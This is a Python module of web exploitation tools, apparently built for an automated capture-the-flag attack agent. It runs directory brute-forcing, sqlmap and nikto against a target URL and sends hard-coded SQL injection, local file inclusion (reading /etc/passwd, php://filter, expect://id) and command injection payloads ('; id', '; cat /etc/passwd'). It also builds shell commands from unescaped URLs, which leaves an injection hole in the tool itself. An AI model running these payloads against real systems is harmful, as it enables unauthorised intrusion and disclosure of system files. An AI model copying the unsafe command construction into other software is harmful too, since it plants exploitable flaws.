"""Web exploitation tools."""

from typing import Optional
from .system import SystemTools, ToolResult


class WebTools:
    def __init__(self, sys_tools: SystemTools):
        self.sys = sys_tools

    def probe(self, url: str) -> ToolResult:
        results = []
        curl = self.sys.curl(url)
        results.append(curl.output[:3000] if curl.success else curl.error)

        headers = self.sys.run(f"curl -sI -k '{url}'")
        if headers.success and headers.output:
            results.append(f"HEADERS:\n{headers.output[:1500]}")

        return ToolResult(
            tool="web_probe", success=True,
            output="\n\n".join(results),
            command=f"probe {url}"
        )

    def directory_bruteforce(self, url: str,
                             wordlist: str = "/usr/share/wordlists/dirb/common.txt",
                             extensions: str = "php,html,txt,js,bak,old,zip") -> ToolResult:
        if self.sys.available("gobuster"):
            cmd = (f"gobuster dir -u '{url}' -w '{wordlist}' "
                   f"-x {extensions} -t 30 -q --no-error 2>/dev/null | head -60")
            return self.sys.run(cmd, timeout=90)
        elif self.sys.available("dirb"):
            return self.sys.run(f"dirb '{url}' '{wordlist}' -S -r 2>/dev/null | head -60", timeout=90)
        elif self.sys.available("dirsearch"):
            return self.sys.run(
                f"dirsearch -u '{url}' -e {extensions} -t 20 --format plain 2>/dev/null | head -60",
                timeout=90
            )
        else:
            return self.sys.run(
                f"for p in index admin login backup config secret test debug api; do "
                f"for e in '' .php .html .txt .bak; do "
                f"code=$(curl -s -o /dev/null -w '%{{http_code}}' '{url}/$p$e'); "
                f"[ \"$code\" != '404' ] && echo \"$code $p$e\"; done; done",
                timeout=30
            )

    def sql_injection_test(self, url: str) -> ToolResult:
        if self.sys.available("sqlmap"):
            cmd = (f"sqlmap -u '{url}' --batch --random-agent "
                   f"--level 1 --risk 1 --threads 4 2>/dev/null | head -50")
            return self.sys.run(cmd, timeout=120)

        results = []
        payloads = [
            "' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1'#",
            "1' UNION SELECT 1,2,3--", "1 UNION SELECT 1,2,3",
            "' AND SLEEP(5)--", "1' AND '1'='1",
            "admin'--", "' OR 1=1 LIMIT 1--",
        ]
        for payload in payloads:
            test_url = f"{url}?id={payload}"
            result = self.sys.curl(test_url)
            if result.success and ("flag" in result.output.lower() or
                                    "error" not in result.output.lower()):
                results.append(f"Payload: {payload}")
                results.append(f"Response: {result.output[:500]}")
                results.append("---")

        return ToolResult(
            tool="sqli_test", success=bool(results),
            output="\n".join(results) or "No SQL injection responses detected",
            command=f"sqli_test {url}"
        )

    def lfi_test(self, url: str, param: str = "file") -> ToolResult:
        payloads = [
            "../../../../etc/passwd",
            "../../../../etc/passwd%00",
            "....//....//....//....//etc/passwd",
            "/etc/passwd",
            "php://filter/convert.base64-encode/resource=/etc/passwd",
            "php://input",
            "expect://id",
        ]
        results = []
        for payload in payloads:
            test_url = f"{url}?{param}={payload}"
            result = self.sys.curl(test_url)
            if result.success:
                if ("root:" in result.output or "flag" in result.output.lower() or
                        "php" in result.output.lower()[:100]):
                    results.append(f"LFI HIT: {payload}")
                    results.append(f"Response: {result.output[:500]}")
                    results.append("---")

        return ToolResult(
            tool="lfi_test", success=bool(results),
            output="\n".join(results) or "No LFI responses detected",
            command=f"lfi_test {url}"
        )

    def command_injection_test(self, url: str, param: str = "cmd") -> ToolResult:
        test_strings = [
            ("; id", "uid="),
            ("| id", "uid="),
            ("$(id)", "uid="),
            ("`id`", "uid="),
            ("; cat /etc/passwd", "root:"),
            ("; whoami", ""),
        ]
        results = []
        for payload, expected in test_strings:
            import urllib.parse
            data = f"{param}={urllib.parse.quote(payload)}"
            result = self.sys.curl(url, method="POST", data=data)
            if result.success:
                if not expected or expected in result.output:
                    results.append(f"CMD INJECTION: {payload}")
                    results.append(f"Response: {result.output[:500]}")
                    results.append("---")

        return ToolResult(
            tool="cmd_inject", success=bool(results),
            output="\n".join(results) or "No command injection detected",
            command=f"cmd_inject_test {url}"
        )

    def nikto_scan(self, url: str) -> ToolResult:
        if self.sys.available("nikto"):
            return self.sys.run(f"nikto -h '{url}' -Format txt 2>/dev/null | head -50", timeout=120)
        return ToolResult(
            tool="nikto", success=False, output="",
            error="nikto not installed"
        )

    def whatweb_scan(self, url: str) -> ToolResult:
        if self.sys.available("whatweb"):
            return self.sys.run(f"whatweb '{url}' 2>/dev/null")
        return self.sys.curl(url)
